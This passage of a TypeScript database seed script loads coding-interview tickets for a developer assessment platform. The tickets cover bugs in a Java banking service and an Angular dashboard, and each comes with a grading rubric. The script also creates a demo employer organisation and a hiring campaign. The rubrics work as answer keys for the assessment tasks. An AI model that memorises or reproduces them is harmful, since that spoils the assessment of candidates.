      title: "FS-13: Cross-currency transfers move raw amounts with no conversion",
      description: "A transfer from a USD account to a EUR account adds the raw number across — 100 USD 'adds 100 EUR' with no conversion and no rejection. Currency is stored but never checked.\n\n**Files:** `service/TransferService.java`",
      difficulty: Difficulty.MID,
      filesInvolved: ["service/TransferService.java"],
      rubric: {
        diagnosis: "Did they identify that transfer() never compares the two accounts' currencies, so cross-currency transfers move raw amounts unguarded?",
        design: "Did they at minimum reject mismatched currencies (or define a clear conversion contract), choosing the safe default of rejecting?",
        communication: "Did they explain why silently treating 100 USD as 100 EUR is a financial bug?",
        execution: "Are cross-currency transfers rejected or correctly converted instead of moving raw amounts?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-fs-14-seed-id-014",
      title: "FS-14: Under load, requests fail with 'connection is not available'",
      description: "During the statement batch plus live traffic, requests fail with HikariCP 'Connection is not available, request timed out'. The pool is size 5. It correlates with long operations holding connections.\n\n**Files:** `service/StatementService.java`, `service/TransferService.java`",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["service/StatementService.java", "service/TransferService.java"],
      rubric: {
        diagnosis: "Did they reason about pool exhaustion — the N+1 holding a connection for hundreds of queries, and/or file IO inside a transaction holding a connection — starving the 5-connection pool?",
        design: "Did they reduce connection hold time (fix N+1, move IO outside the transaction, keep transactions short) rather than just enlarging the pool, identifying the worst offender?",
        communication: "Did they explain how holding connections during slow work exhausts a small pool?",
        execution: "Does the service stop timing out under batch + live load without merely masking it by sizing up the pool?",
      },
      expectedMinutes: 55,
    },
    {
      id: "ticket-fs-15-seed-id-015",
      title: "FS-15: Incomplete, non-atomic audit trail for transfers",
      description: "Compliance needs an immutable record of each transfer: who, to whom, how much, when, resulting balances. Today the Transaction omits balances and is written outside a guaranteed-atomic boundary, so it can diverge from what actually happened.\n\n**Files:** `service/TransferService.java`, `model/Transaction.java`",
      difficulty: Difficulty.MID,
      filesInvolved: ["service/TransferService.java", "model/Transaction.java"],
      rubric: {
        diagnosis: "Did they recognize the audit record is incomplete and written outside a guaranteed-atomic boundary, so it can diverge from the real balance changes?",
        design: "Did they enrich the Transaction and ensure it's written in the SAME transaction as the balance changes (atomic), considering immutability?",
        communication: "Did they explain why the audit record must be part of the same atomic unit as the money movement?",
        execution: "Is a complete audit record written atomically with every successful transfer and never for a failed one?",
      },
      expectedMinutes: 35,
    },
  ];

  for (const t of finserveTickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.JAVA, codebaseId: finserveCodebase.id },
    });
  }

  // ─── PulseDash — Angular 17 admin dashboard ─────────────────────────────────
  const pulsedashCodebase = await prisma.codebase.upsert({
    where: { id: "pulsedash-seed-id-001" },
    update: { repoUrl: "https://github.com/DevSimulate/pulsedash" },
    create: {
      id: "pulsedash-seed-id-001",
      name: "PulseDash",
      stack: Stack.ANGULAR,
      repoUrl: "https://github.com/DevSimulate/pulsedash",
      description: "An Angular 17 admin dashboard — live metrics, a searchable user table, an OnPush alerts panel, and a reactive invite form. Real-time UI where RxJS hygiene and change detection matter.",
      companyLore: `Helios Analytics runs PulseDash as the ops team's always-open window into production. It refreshes live, so the bugs that bite are the quiet ones: a leaked subscription that piles up over a shift, a mutation the OnPush view never repaints, a search box that shows stale results because responses arrive out of order.`,
    },
  });

  const pulsedashTickets = [
    {
      id: "ticket-pd-01-seed-id-001",
      title: "PD-01: The user table flickers and scrolls jump on every search keystroke",
      description: "Typing in the search box rebuilds the entire user table from scratch each keystroke — rows flash, focus and scroll position jump, and it's janky with more rows.\n\n**Files:** `src/app/components/user-list.component.ts`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/app/components/user-list.component.ts"],
      rubric: {
        diagnosis: "Did they identify that *ngFor has no trackBy, so when the users array is replaced Angular destroys and recreates every row DOM node instead of reusing them?",
        design: "Did they add a trackBy returning a stable identity (u.id)? Did they confirm the same array-replacement pattern benefits from it?",
        communication: "Did they explain how trackBy lets Angular diff by identity and reuse DOM nodes?",
        execution: "Do rows persist across searches instead of being fully rebuilt?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-pd-02-seed-id-002",
      title: "PD-02: The invite form submits with no role selected",
      description: "The spec says role is required, but you can submit the invite form with the role left on 'Select role…'. The Invite button is enabled and submit goes through with an empty role.\n\n**Files:** `src/app/components/user-form.component.ts`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/app/components/user-form.component.ts"],
      rubric: {
        diagnosis: "Did they spot that the role FormControl has no Validators.required, so the form is valid with an empty role and the disabled binding never triggers?",
        design: "Did they add Validators.required to role (and verify the empty-string default counts as invalid)? Did they consider showing a hint like the email field?",
        communication: "Did they explain reactive-form validation and how form.invalid drives the disabled state?",
        execution: "Is the form invalid (Invite disabled) until a real role is chosen?",
      },
      expectedMinutes: 15,
    },
    {
      id: "ticket-pd-03-seed-id-003",
      title: "PD-03: Acknowledging an alert doesn't update the panel",
      description: "Clicking 'Acknowledge' on an alert does nothing visible — the button stays, the '✓ acknowledged' text never appears — until you interact with something else on the page, then it suddenly updates.\n\n**Files:** `src/app/components/alerts.component.ts`, `src/app/services/dashboard.service.ts`",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/app/components/alerts.component.ts", "src/app/services/dashboard.service.ts"],
      rubric: {
        diagnosis: "Did they connect the dots: the component uses ChangeDetectionStrategy.OnPush, but acknowledge() MUTATES the alert object in place (a.acknowledged = true) without changing the array reference or any @Input — so OnPush doesn't re-render until an unrelated event triggers CD?",
        design: "Did they make the change detectable under OnPush — produce a new array/object (immutable update), or use signals, or markForCheck()? Did they pick an idiomatic OnPush-friendly approach rather than switching back to default CD?",
        communication: "Did they explain how OnPush change detection keys off reference changes / events and why in-place mutation is invisible to it?",
        execution: "Does the alert visibly flip to acknowledged immediately on click, under OnPush?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-pd-04-seed-id-004",
      title: "PD-04: The dashboard gets slower the longer it's left open",
      description: "After the dashboard tab is open for a while, CPU creeps up and the app gets sluggish. The 'Refreshed N times' counter keeps climbing even after navigating away and back, and memory grows. It correlates with how long the page has been open.\n\n**Files:** `src/app/components/dashboard.component.ts`",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/app/components/dashboard.component.ts"],
      rubric: {
        diagnosis: "Did they identify the interval(5000).subscribe(...) that is never unsubscribed, so the timer (and its load() calls) keeps running after the component is destroyed, leaking subscriptions and stacking up over time?",
        design: "Did they tear down the subscription on destroy — takeUntil(destroy$), takeUntilDestroyed, async pipe, or unsubscribe in ngOnDestroy? Did they apply the same hygiene consistently?",
        communication: "Did they explain Observable subscription leaks and the standard teardown patterns?",
        execution: "Does the interval stop when the component is destroyed, with no accumulating timers?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-pd-05-seed-id-005",
      title: "PD-05: Fast typing in search shows the wrong results",
      description: "When you type quickly in the user search, the table sometimes ends up showing results for an earlier query, not the latest one. Slow typing is fine; fast typing produces stale results that don't match what's in the box.\n\n**Files:** `src/app/components/user-list.component.ts`",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/app/components/user-list.component.ts"],
      rubric: {
        diagnosis: "Did they identify the nested-subscribe anti-pattern — valueChanges.subscribe(q => searchUsers(q).subscribe(...)) — which fires overlapping requests with different latencies, so an earlier (slower) response can resolve AFTER a later one and overwrite the correct results (race condition / out-of-order)?",
        design: "Did they flatten with switchMap so a new query cancels the in-flight previous request, guaranteeing only the latest result lands? Did they also add debounceTime/distinctUntilChanged as appropriate, and avoid the nested subscribe?",
        communication: "Did they explain why switchMap (cancel-previous) is correct here versus mergeMap, and how out-of-order responses cause stale UI?",
        execution: "Does the table always reflect the latest query even under fast typing?",
      },
      expectedMinutes: 50,
    },
    {
      id: "ticket-pd-06-seed-id-006",
      title: "PD-06: The role column re-computes constantly and drags performance",
      description: "Profiling shows roleLabel() being called an enormous number of times — far more than there are rows — on every interaction anywhere on the page, contributing to the jank.\n\n**Files:** `src/app/components/user-list.component.ts`",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/app/components/user-list.component.ts"],
      rubric: {
        diagnosis: "Did they identify that calling a method ({{ roleLabel(u) }}) in the template runs it on every change-detection cycle for every row, not just when data changes?",
        design: "Did they remove the per-CD work — precompute the label on the model, use a pure pipe, or OnPush — so it's computed only when inputs change? Did they pick an idiomatic fix?",
        communication: "Did they explain why function calls in templates are a change-detection performance trap?",
        execution: "Is the role label no longer recomputed every CD cycle?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-pd-07-seed-id-007",
      title: "PD-07: When the alerts request fails, the panel silently shows nothing",
      description: "If the alerts endpoint errors, the panel just shows an empty list with no indication anything went wrong — operators think there are zero alerts when really the request failed.\n\n**Files:** `src/app/components/alerts.component.ts`",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/app/components/alerts.component.ts"],
      rubric: {
        diagnosis: "Did they identify that catchError(() => []) swallows the error and emits an empty list with no signal to the user, so a failure is indistinguishable from 'no alerts'? Did they note returning a bare [] is also a smell (should be of([]) / an Observable)?",
        design: "Did they surface the error state to the user (an error flag/message) while still degrading gracefully, and return a proper Observable from catchError? Did they distinguish empty-success from error?",
        communication: "Did they explain why silently swallowing HTTP errors is dangerous for an ops dashboard?",
        execution: "Does a failed request show an error state rather than a misleading empty panel?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-pd-08-seed-id-008",
      title: "PD-08: Selecting a user in one panel doesn't always reflect everywhere",
      description: "The user table writes the loaded list into a shared service field that other components read directly. After a search filters the list, other parts of the app that read the shared users still behave as if the full list is present, and selection state gets confusing.\n\n**Files:** `src/app/services/dashboard.service.ts`, `src/app/components/user-list.component.ts`",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/app/services/dashboard.service.ts", "src/app/components/user-list.component.ts"],
      rubric: {
        diagnosis: "Did they identify the shared-mutable-state smell — components both write and read dashboard.users directly, and the user list overwrites it with filtered search results, so the 'source of truth' silently changes meaning between 'all users' and 'current search results'?",
        design: "Did they separate the canonical list from the filtered view (don't overwrite the shared list with search results), and/or expose state as an Observable/signal with a clear single source of truth instead of a public mutable array?",
        communication: "Did they explain why shared mutable arrays across components cause hard-to-trace state bugs?",
        execution: "Is the canonical user list no longer clobbered by transient search results, with a clear state model?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-pd-09-seed-id-009",
      title: "PD-09: Inactive users should be visually muted but aren't",
      description: "The design calls for inactive users to render greyed out. Right now active and inactive rows look identical except for the text label, because the row styling never reacts to the active flag.\n\n**Files:** `src/app/components/user-list.component.ts`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/app/components/user-list.component.ts"],
      rubric: {
        diagnosis: "Did they identify that there's no class/style binding tied to u.active on the row, so inactive users get no visual treatment?",
        design: "Did they add a clean conditional class binding ([class.inactive]=\"!u.active\") driven by the model rather than ad-hoc logic?",
        communication: "Did they explain Angular class/style binding for state-driven styling?",
        execution: "Do inactive rows render visually distinct from active ones?",
      },
      expectedMinutes: 15,
    },
    {
      id: "ticket-pd-10-seed-id-010",
      title: "PD-10: The metric tiles sometimes don't update on refresh",
      description: "The dashboard auto-refreshes metrics every few seconds, but occasionally the tiles don't visibly change even though new data arrived. It's intermittent and more noticeable under load.\n\n**Files:** `src/app/components/dashboard.component.ts`",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/app/components/dashboard.component.ts"],
      rubric: {
        diagnosis: "Did they identify that load() mutates the existing metrics array in place (length = 0; push) rather than assigning a new array reference, which can fail to trigger updates (especially if the component or a child uses OnPush, or with trackBy keyed incorrectly)?",
        design: "Did they assign a new array (this.metrics = m) for clean, reference-based change detection, or otherwise ensure the view reliably updates? Did they reason about CD and references?",
        communication: "Did they explain reference vs in-place mutation and how Angular detects array changes?",
        execution: "Do the tiles reliably reflect each refresh's data?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-pd-11-seed-id-011",
      title: "PD-11: AppComponent leaks a subscription to the selected user",
      description: "The root component subscribes to selectedUser$ in its constructor and never cleans it up. It's long-lived so it doesn't crash, but it's the same anti-pattern that's biting elsewhere and sets a bad example for the codebase.\n\n**Files:** `src/app/app.component.ts`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/app/app.component.ts"],
      rubric: {
        diagnosis: "Did they identify the unmanaged subscription in the constructor with no teardown, and note that subscribing in the constructor (vs ngOnInit) and never unsubscribing is poor hygiene?",
        design: "Did they switch to the async pipe in the template (preferred) or add proper teardown (takeUntilDestroyed/ngOnDestroy)? Did they justify async pipe as the cleanest option here?",
        communication: "Did they explain the leak pattern and why async pipe avoids manual teardown?",
        execution: "Is the selected-user binding handled without a manually-leaked subscription?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-pd-12-seed-id-012",
      title: "PD-12: Search fires a request on every keystroke, hammering the backend",
      description: "Every single keystroke in the user search triggers a backend call. Typing a 10-letter name fires 10 requests. We need to debounce and skip duplicate queries.\n\n**Files:** `src/app/components/user-list.component.ts`",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/app/components/user-list.component.ts"],
      rubric: {
        diagnosis: "Did they identify that valueChanges triggers a query per keystroke with no debounceTime or distinctUntilChanged, producing redundant load?",
        design: "Did they add debounceTime and distinctUntilChanged in the RxJS pipeline (ideally alongside switchMap from PD-05) so only settled, changed queries hit the backend?",
        communication: "Did they explain debounce/distinct and the request-reduction benefit?",
        execution: "Does typing a word produce a single settled request rather than one per keystroke?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-pd-13-seed-id-013",
      title: "PD-13: The whole page reloads metrics and users together, causing visible stalls",
      description: "Components each kick off their own loads in ngOnInit with overlapping delays, and the auto-refresh re-triggers full reloads. Under slow network the UI stalls in bursts. We want resilient loading that doesn't block the rest of the dashboard.\n\n**Files:** `src/app/components/dashboard.component.ts`, `src/app/components/user-list.component.ts`",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/app/components/dashboard.component.ts", "src/app/components/user-list.component.ts"],
      rubric: {
        diagnosis: "Did they reason about the loading strategy — multiple imperative subscribe()s, full reloads on every interval tick, no loading/error states, and no use of the async pipe — making the UI stall in bursts and re-fetch more than needed?",
        design: "Did they move to a declarative data flow (async pipe, shareReplay for shared streams, error/loading handling, refresh via a trigger Subject rather than re-subscribing) so slow calls degrade gracefully without blocking the page? Did they avoid over-engineering?",
        communication: "Did they explain declarative vs imperative data loading and how it isolates failures and reduces redundant fetches?",
        execution: "Does the dashboard load resiliently, with slow/failed calls not freezing unrelated parts?",
      },
      expectedMinutes: 55,
    },
    {
      id: "ticket-pd-14-seed-id-014",
      title: "PD-14: Email validation accepts obviously invalid addresses",
      description: "The invite form's email field accepts values like 'a@b' and rejects nothing beyond truly empty. QA wants it to reject malformed addresses while staying friendly for valid ones.\n\n**Files:** `src/app/components/user-form.component.ts`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/app/components/user-form.component.ts"],
      rubric: {
        diagnosis: "Did they evaluate the current email validation (Validators.email is lenient) and identify where it lets through addresses the product considers invalid, plus that the hint shows even before the user types (touched/dirty not considered)?",
        design: "Did they strengthen validation appropriately (a stricter pattern or combined validators) AND only show the error after the field is touched/dirty, avoiding false negatives on valid emails?",
        communication: "Did they explain validator trade-offs and touched/dirty-gated error display?",
        execution: "Are clearly-invalid emails rejected, valid ones accepted, and the hint shown only after interaction?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-pd-15-seed-id-015",
      title: "PD-15: No empty/loading state — the dashboard looks broken before data arrives",
      description: "On first load (and during the simulated delay) every panel is blank with no spinner or skeleton, so the app looks broken until data pops in. We want clear loading and empty states across the dashboard.\n\n**Files:** `src/app/components/user-list.component.ts`, `src/app/components/dashboard.component.ts`, `src/app/components/alerts.component.ts`",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/app/components/user-list.component.ts", "src/app/components/dashboard.component.ts", "src/app/components/alerts.component.ts"],
      rubric: {
        diagnosis: "Did they identify there is no loading or empty-state handling — components render nothing until the delayed Observable emits, so the UI looks broken meanwhile?",
        design: "Did they add loading and empty states (a loading flag or the async pipe with *ngIf; else loading template) consistently across panels, distinguishing 'loading' from 'loaded but empty'? Did they keep it DRY?",
        communication: "Did they explain the three UI states (loading / empty / loaded) and why each needs distinct handling?",
        execution: "Do panels show a loading indicator, then either data or a clear empty state?",
      },
      expectedMinutes: 35,
    },
  ];

  for (const t of pulsedashTickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.ANGULAR, codebaseId: pulsedashCodebase.id },
    });
  }

  // ─── LMKR demo employer org + campaign ──────────────────────────────────────
  // The whole platform uses GitHub OAuth (no passwords), so the "employer" is an
  // existing GitHub user added as an ADMIN of the LMKR org. Change EMPLOYER_GH to
  // whichever GitHub account should own the LMKR dashboard.
  const EMPLOYER_GH = "OSSAMA-prog-droid";

  const lmkrOrg = await prisma.organisation.upsert({
    where: { id: "lmkr-org-seed-001" },
    update: {},
    create: { id: "lmkr-org-seed-001", name: "LMKR", domain: "lmkr.com", plan: "HIRING" },
  });

  const employerUser = await prisma.user.findUnique({
    where: { githubUsername: EMPLOYER_GH },
  });
  if (employerUser) {
    await prisma.orgMember.upsert({
      where: { orgId_userId: { orgId: lmkrOrg.id, userId: employerUser.id } },
      update: { role: OrgRole.ADMIN },
      create: { orgId: lmkrOrg.id, userId: employerUser.id, role: OrgRole.ADMIN },
    });
    console.log(`[seed] LMKR admin set to GitHub user ${EMPLOYER_GH}`);
  } else {
    console.log(`[seed] LMKR org created, but GitHub user ${EMPLOYER_GH} not found yet — log in once, then re-run seed to attach as admin.`);
  }

  const deadline = new Date();
  deadline.setDate(deadline.getDate() + 30);

  await prisma.campaign.upsert({
    where: { id: "lmkr-campaign-seed-001" },
    update: {},
    create: {
      id: "lmkr-campaign-seed-001",
      orgId: lmkrOrg.id,
      roleName: "Senior .NET Developer",
      codebaseId: "novatech-crm-seed-id-001",
      difficulty: Difficulty.SENIOR,
      candidateLimit: 500,
      deadline,
      companyName: "LMKR",
      bookingLink: "https://lmkr.com/careers/apply",
      shareableSlug: "lmkr-senior-net-developer-demo",
      status: CampaignStatus.ACTIVE,
    },
  });

  await prisma.$disconnect();
  console.log(
    `[seed] Done — ${tickets.length} NovaTech + ${sdTickets.length} SD + ${ragTickets.length} RAGCore + ${techCorpTickets.length} TechCorp + ${shopfrontTickets.length} ShopFront + ${dataforgeTickets.length} DataForge + ${infracoreTickets.length} InfraCore + ${matchcoreTickets.length} MatchCore + ${finserveTickets.length} FinServe + ${pulsedashTickets.length} PulseDash tickets + LMKR demo campaign upserted.`
  );
}
